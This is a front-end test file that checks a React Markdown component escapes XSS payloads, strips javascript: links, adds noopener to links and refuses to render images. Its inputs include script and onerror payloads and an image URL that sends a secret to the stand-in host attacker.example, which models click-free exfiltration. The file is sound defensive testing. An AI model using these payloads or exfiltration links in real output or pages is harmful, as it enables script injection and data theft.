import { renderToStaticMarkup } from "react-dom/server";
import { render, screen } from "@testing-library/react";
import { Markdown } from "@/components/Markdown";

describe("Markdown", () => {
  it("renders a script tag as text, not an element", () => {
    const { container } = render(
      <Markdown>{"hello <script>alert(1)</script>"}</Markdown>,
    );
    expect(container.querySelector("script")).toBeNull();
    expect(container.textContent).toContain("<script>alert(1)</script>");
  });

  it("renders an img onerror payload as text, not an element", () => {
    const { container } = render(<Markdown>{'<img src=x onerror="alert(1)">'}</Markdown>);
    expect(container.querySelector("img")).toBeNull();
    expect(container.textContent).toContain('<img src=x onerror="alert(1)">');
  });

  it("neutralises javascript: links", () => {
    render(<Markdown>{"[click](javascript:alert(1))"}</Markdown>);
    const link = screen.queryByRole("link", { name: "click" });
    expect(link?.getAttribute("href") ?? "").not.toMatch(/^javascript:/i);
  });

  it("renders GFM tables and monospace SQL fences", () => {
    const md = "| a | b |\n|---|---|\n| 1 | 2 |\n\n```sql\nSELECT 1;\n```";
    render(<Markdown>{md}</Markdown>);
    expect(screen.getByRole("table")).toBeInTheDocument();
    expect(screen.getByText("SELECT 1;")).toHaveClass("font-mono");
  });

  it("opens links safely in a new tab", () => {
    render(<Markdown>{"[docs](https://example.com)"}</Markdown>);
    const link = screen.getByRole("link", { name: "docs" });
    expect(link).toHaveAttribute("rel", expect.stringContaining("noopener"));
  });

  it("never renders images or preload links (no click-free exfiltration)", () => {
    const md = "![alt text](https://attacker.example/p?d=SECRET)";
    const html = renderToStaticMarkup(<Markdown>{md}</Markdown>);
    expect(html).not.toContain("<img");
    expect(html).not.toContain("<link");
    expect(html).not.toContain("attacker.example");
    const { container } = render(<Markdown>{md}</Markdown>);
    expect(container.querySelector("img, link")).toBeNull();
    expect(container.textContent).toContain("alt text");
  });

  it("renders a link with an empty sanitized href as plain text", () => {
    render(<Markdown>{"[click](javascript:alert(1))"}</Markdown>);
    expect(screen.queryByRole("link")).toBeNull();
    expect(screen.getByText("click")).toBeInTheDocument();
  });
});
